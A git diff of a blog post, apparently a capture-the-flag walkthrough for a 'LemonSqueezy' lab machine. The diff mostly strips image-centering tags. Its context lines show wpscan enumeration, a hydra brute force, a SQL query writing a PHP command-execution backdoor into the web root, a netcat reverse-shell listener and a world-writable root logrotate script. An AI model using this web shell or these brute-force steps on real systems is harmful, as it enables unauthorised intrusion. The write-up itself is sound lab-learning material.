@@ -74,9 +74,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 I decided to enumerate the wordpress directory first which was running a default wordpress theme.
 
-<center><br>
 <img src="/assets/img/uploads/lemonsqueezy/wordpress.png">
-</center>
 
 I ran wpscan to enumerate for wordpress users and found two users named <b>lemon</b> and <b>orange.</b>
 
@@ -105,9 +103,7 @@ root@kali:~# wpscan --url http://lemonsqueezy/wordpress/ --enumerate u
 
 The next goal was to log into wordpress, I tried some random passwords with the usernames but none of them worked. So the next option was to brute force the login. For this, I set up a burp proxy and captured the login request.
 
-<center><br>
 <img src="/assets/img/uploads/lemonsqueezy/burp.png">
-</center>
 
 Then I used hydra to brute force the login credentials for user <b>orange</b> and found the password <b>ginger.</b>
 ```r
@@ -125,40 +121,29 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-15 16:20:
 
 After logging in as user orange, I found a post draft named "Keep this Safe" which contained some text, most probably a password.  
 
-<center><br>
 <img src="/assets/img/uploads/lemonsqueezy/wp-password.png">
-</center>
-
 
 ## User Shell
 
 After some guesses, I found that this password can be used to login into the <b>phpmyadmin</b> page with the username <b>orange</b> and password <b>nOt1n@wOrdl1st!</b> 
 
-
-<center><br>
 <img src="/assets/img/uploads/lemonsqueezy/phpmyadmin.png">
-</center>
 
 Then, I went to the SQL tab, where we can execute SQL queries on localhost and created a simple php backdoor.
 
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/backdoor.php"
 ```
-<center><br>
+
 <img src="/assets/img/uploads/lemonsqueezy/php-backdoor.png">
-</center>
 
 The command executed without any errors. Then I went to the location, where the backdoor was created and executed the <b>id</b> command.
 
-<center><br>
 <img src="/assets/img/uploads/lemonsqueezy/backdoor-id.png">
-</center>
 
 That was a success! Now it was time to get a netcat reverse shell back to the host machine and read our first flag!
 
-<center><br>
 <img src="/assets/img/uploads/lemonsqueezy/rev-shell.png">
-</center>
 
 ```r
 root@kali:~# nc -lvnp 9001
@@ -203,10 +188,7 @@ chmod +x pspy64
 ```
 Then I gave it executable permissions and after executing the script, I found a logrotate process running as root which repeats itself after some interval.
 
-<center><br>
 <img src="/assets/img/uploads/lemonsqueezy/pspy.png">
-</center>
-
 
 I went to <b>/etc/logrotate.d/</b> directory and found that the <b>logrotate</b> is a python script which is world writable.
 
